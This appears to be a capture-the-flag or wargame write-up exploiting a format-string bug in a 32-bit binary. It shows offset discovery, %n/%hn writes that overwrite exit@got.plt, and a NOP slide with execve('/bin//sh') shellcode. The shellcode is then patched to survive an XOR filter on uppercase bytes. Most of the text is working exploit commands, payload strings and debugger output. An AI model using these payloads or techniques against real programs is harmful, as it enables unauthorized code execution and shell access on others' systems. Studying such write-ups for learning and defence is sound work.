
=> We have a fgets that fill a buffer at most 100 bytes
=> The loop modify value of the buffer's values between "@" and "[" 
=> Every values between 0x41 - 0x5a is modified by a XOR 0x20
=> The buffer is then printed 


=> Let's try to fill the buffer of "A"  
=> It doesn't touch the ret addr of main 
=> We can see that the buffer in printed with the printf function without the format protection 
=> Then we have string format exploit 

=> We will try to overwrite the exit plt by an address pointing to an address in our buffer
pointing to NOP slide and a shell code

0xffffd5b0:	0xffffd664	0x00000000	0x41414141	0x41414141
0xffffd5c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd600:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd610:	0x41414141	0x41414141	0x00414141	0x00000000

=> This is values of our stack filled by "A"
=> Let's reserve some bytes for the format string and pick a value to point to
=> We pick 0xffffd5e0

=> We create the payload to overwrite exit@got.plt

=> Firstly we calcul the offset from an arbitrary address write at the start of our buffer
r < <(python -c 'print "AAAA" + "%p "*15') 
aaaa0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd664 (nil) 0x61616161 <- Found

=> Offset: 10


=> After that we will slice the address in 2 and write the last 2 bytes with the h (short) format

0x80497e0 <exit@got.plt>:	0x08048376

ffff:				  65535
d5ef:	54767 - 8 (2 addr) 	= 54759
rest:	65535 - 54767		= 10768

r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54759x" + "%10$n" + "%10768x" + "%11$hn" + "\xcc"*(62-28)')


=> It works it's catch by the SIGTRAP
=> Then we replace the \xcc by the NOP slide and the shell code 


r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54759x" + "%10$n" + "%10768x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

=> It doesn't work ! We have a segfault at 0xffffd66d
Program received signal SIGSEGV, Segmentation fault.
0xffffd66d in ?? ()

=> Which is a address nowhere 
=> Let's check the stack 
0xffffd5ec:	0x90909090	0x90909090	0x90909090	0x31909090
0xffffd5fc:	0x2f6870c0	0x6868732f	0x6e69622f	0xc189e389

=> Look at the start of our shellcode 31 c0 70
=> The 0x50 has been transformed to 0x70 
=> It's because we forget that every value [0x41 - 0x5a] are modified with XOR 0x20
=> Let's replace this place with a different instruction 

0:  31 c0                   xor    eax,eax
2:  50                      push   eax

0:  31 c0                   xor    eax,eax
2:  6a 00                   push   0x0

=> We push 0x0 or eax (= 0 after xor) for the null terminated character to the stack

r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54759x" + "%10$n" + "%10768x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
